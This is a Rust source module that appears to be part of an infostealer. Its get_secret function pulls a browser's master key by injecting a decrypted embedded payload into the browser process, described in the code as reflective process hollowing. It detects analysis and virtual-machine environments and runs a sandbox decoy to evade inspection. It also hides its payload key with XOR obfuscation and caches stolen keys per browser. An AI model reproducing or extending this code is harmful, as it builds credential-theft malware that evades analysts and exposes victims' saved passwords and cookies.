use std::{collections::HashMap, collections::HashSet, sync::Mutex};

use super::{env_configured, is_analysis_environment, run_sandbox_decoy, zeroize_vec};

const XOR_KEY: u8 = 0x5A;
const PAYLOAD_KEY_ENC: &[u8] = &[
    0x39, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x2A, 0x3B, 0x23, 0x36, 0x35, 0x3B, 0x3E, 0x05, 0x31,
];

const EMBEDDED_PAYLOAD_ENC: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload.enc"));

static KEY_CACHE: Mutex<Option<HashMap<String, Vec<u8>>>> = Mutex::new(None);
static FAIL_CACHE: Mutex<Option<HashSet<String>>> = Mutex::new(None);

fn payload_key() -> [u8; 16] {
    let mut key = [0u8; 16];
    for (i, slot) in key.iter_mut().enumerate() {
        *slot = PAYLOAD_KEY_ENC[i] ^ XOR_KEY;
    }
    key
}

fn decrypt_payload() -> Vec<u8> {
    let key = payload_key();
    let mut out = EMBEDDED_PAYLOAD_ENC.to_vec();
    for (i, b) in out.iter_mut().enumerate() {
        *b ^= key[i % key.len()];
    }
    out
}

/// Recover the browser master key via reflective process hollowing injection.
pub fn get_secret(browser_name: &str) -> Option<Vec<u8>> {
    if is_analysis_environment() {
        if super::is_virtualized_environment() {
            run_sandbox_decoy();
        }
        return None;
    }
    if !env_configured() {
        return None;
    }

    if EMBEDDED_PAYLOAD_ENC.is_empty() {
        return None;
    }

    if let Ok(guard) = FAIL_CACHE.lock() {
        if guard.as_ref().is_some_and(|s| s.contains(browser_name)) {
            return None;
        }
    }
    if let Ok(guard) = KEY_CACHE.lock() {
        if let Some(map) = guard.as_ref() {
            if let Some(key) = map.get(browser_name) {
                return Some(key.clone());
            }
        }
    }

    let mut payload = decrypt_payload();
    let key = match inject::process_data(browser_name, &payload) {
        Some(k) => k,
        None => {
            zeroize_vec(&mut payload);
            if let Ok(mut guard) = FAIL_CACHE.lock() {
                if guard.is_none() {
                    *guard = Some(HashSet::new());
                }
                if let Some(set) = guard.as_mut() {
                    set.insert(browser_name.to_string());
                }
            }
            return None;
        }
    };
    zeroize_vec(&mut payload);

    if let Ok(mut guard) = KEY_CACHE.lock() {
        if guard.is_none() {
            *guard = Some(HashMap::new());
        }
        if let Some(map) = guard.as_mut() {
            map.insert(browser_name.to_string(), key.clone());
        }
    }

    Some(key)
}
